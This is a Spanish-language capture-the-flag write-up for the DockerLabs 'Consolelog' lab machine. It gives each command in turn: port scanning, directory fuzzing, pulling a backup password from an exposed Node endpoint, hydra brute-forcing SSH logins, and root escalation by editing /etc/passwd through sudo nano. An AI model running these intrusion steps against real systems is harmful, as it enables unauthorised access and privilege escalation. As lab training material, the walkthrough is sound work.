Maquina: Consolelog
Nivel: Facil
Obejtivo:
Descripcion:



En la pagina de dockerlabs descargamos la maquina vulnerable y lo descomprimimos con: unzip consolelog.zip para desplegarlo con sudo bash auto_deploy.sh consolelog.tar


Hacemos un ping -c1 172.17.0.3 para confirmar que tenemos conexion a la maquina.


Hacemos un sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.3 -oG allPorts.txt para encontrar los puertos abiertos de la maquina: 
PORT     STATE SERVICE REASON
80/tcp   open  http    syn-ack ttl 64
3000/tcp open  ppp     syn-ack ttl 64
5000/tcp open  upnp    syn-ack ttl 64


Con mi scrip extractPorts allPorts.txt obtenemos los puertos y la IP de la mauina para usarlo con nmap -sC -sV -p80,3000,5000 172.17.0.3 -oN target.txt para buscar versiones y servicios


Entramos a la pagina web que se encuntra en el puerto :80 donde no encotramos alguna vulnerabilidad



Entramos a la pagina que se encuentra en el puerto :3000 y no encontre alguna vulnerabilidad destacable


Hice fuzzin gobuster dir -u http://172.17.0.3/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 -add-slash -b 403,404 -x php,html,txt y encontre tres directorios ocultos
/index.html           
/backend              
/javascript          
Use otra vez fuzzing a los directorios encontrados: gobuster dir -u http://172.17.0.3/javascript -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 -add-slash -b 403,404 -x php,html,txt
/events               
/util                 
/async  
Al realizar fuzzin y encontrar varios directorios no se encontro nada de interes asi que buscamos entre los directorios de http://172.17.0.3/backend/
6-8



En http://172.17.0.3/backend/server.js y nos podemos dar cuenta que este servidor expone un endpoint POST en la ruta /recurso/ y escucha en el puerto 3000 en todas las interfaces de red (0.0.0.0).



Hacemos una curl: curl -X POST http://172.17.0.3:3000/recurso/ -H "Content-Type: application/json" -d '{"token":"tokentraviesito"}' y obtenemos la contraseña: lapassworddebackupmaschingonadetodas



Con estra contraseña usaremos hydra para encontrar un usuario y entrar al servicio de SSH: hydra -L /usr/share/wordlists/rockyou.txt -p lapassworddebackupmaschingonadetodas ssh://172.17.0.3:5000 -t 4 
y encontramos las credenciales: [5000][ssh] host: 172.17.0.3   login: lovely   password: lapassworddebackupmaschingonadetodas 
Notar tenemos que cambiar el puerto ya que no es el puerto 22



Entramos a SSH ssh -p 5000 lovely@172.17.0.3 con las credenciales encontradas, con el comando sudo -l encontramos (ALL) NOPASSWD: /usr/bin/nano eso significa que podemos usar nano, nos vamos a nano /etc/passwd para modificar 
la primera linea y quitar x de root: root::0:0:root:/root:/bin/bash guardamos cerramos y entramos como root: su root y no nos pedira contraseña
Nota: Me salio Error opening terminal: xterm-kitty. significa que el contenedor (o entorno) donde estás ejecutando el comando no reconoce o no tiene soporte para el tipo de terminal "xterm-kitty" 
Y establesco un tipo de terminal más común, como xterm 
export TERM=xterm










